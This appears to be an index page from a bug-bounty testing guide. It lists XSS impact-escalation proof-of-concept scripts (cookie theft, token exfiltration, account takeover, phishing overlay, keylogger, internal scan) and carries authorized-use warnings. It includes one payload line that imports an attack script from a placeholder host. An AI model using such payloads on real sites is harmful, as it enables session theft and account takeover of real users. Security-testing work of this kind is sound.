# XSS — PoC Scripts

**Impact-phase escalation payloads** that turn `alert(document.domain)` into the demonstrable impact that
actually pays — session/token theft, CSRF-token-driven account takeover, blind-XSS landing detection,
in-origin phishing, keylogging, and internal recon. **Click a script to open it on its own page.**

> ⚠️ **Authorized use only.** Exfiltrate **only your own test data** to **your own** collaborator. For
> cross-user / ATO demos use **two of your own test accounts** (attacker A → victim B). Never collect real
> users' cookies/tokens/PII, never deface or release self-propagating (worm) payloads, and **clean up**
> planted payloads, added keys/admins, and registered service workers afterward.

| Script | Demonstrates |
|---|---|
| [`poc-listener.py`](#/xss/poc/poc-listener) | A minimal exfil/callback server you control — quick local sink for PoCs (or use Burp Collaborator / interactsh / XSS-Hunter). |
| [`blind_xss.js`](#/xss/poc/blind_xss) | Beacon that proves **where** a blind/stored payload fired — URL + DOM + title. |
| [`cookie_steal.js`](#/xss/poc/cookie_steal) | Session-cookie theft (only when the cookie is **not** `HttpOnly`). |
| [`token_exfil.js`](#/xss/poc/token_exfil) | localStorage / sessionStorage (JWT/OAuth) theft + an API call as the victim. |
| [`account_takeover.js`](#/xss/poc/account_takeover) | Read CSRF token → force email/password change → **ATO** (works even with `HttpOnly` cookies). |
| [`phish_overlay.js`](#/xss/poc/phish_overlay) | In-origin credential-harvest overlay with the **authentic** URL bar. |
| [`keylogger.js`](#/xss/poc/keylogger) | Keystroke / sensitive-field capture. |
| [`internal_scan.js`](#/xss/poc/internal_scan) | Internal host/port recon from the victim browser — an SSRF-ish pivot. |

## How to present these in a report
1. **Discover** with a polyglot, **identify the context** (guide §5), switch to the *minimal* context-correct trigger.
2. Attach **one** of these scripts as the escalation — e.g. `<svg onload="import('//YOUR.oast.fun/cookie_steal.js')">`.
3. Capture the callback log / screenshot proving execution **in the target origin** *and* the **impact**
   (victim account email changed in their session). Keep it safe and reversible; **describe** — don't perform —
   anything destructive or wormable.

> Each script ships with placeholder hosts (`YOUR.oast.fun`, `MY-TEST-INBOX`). Read the **Testing Guide**
> (Part IV) for the full impact order and the **Zero to Expert (Q&A)** for the *why* behind each one.
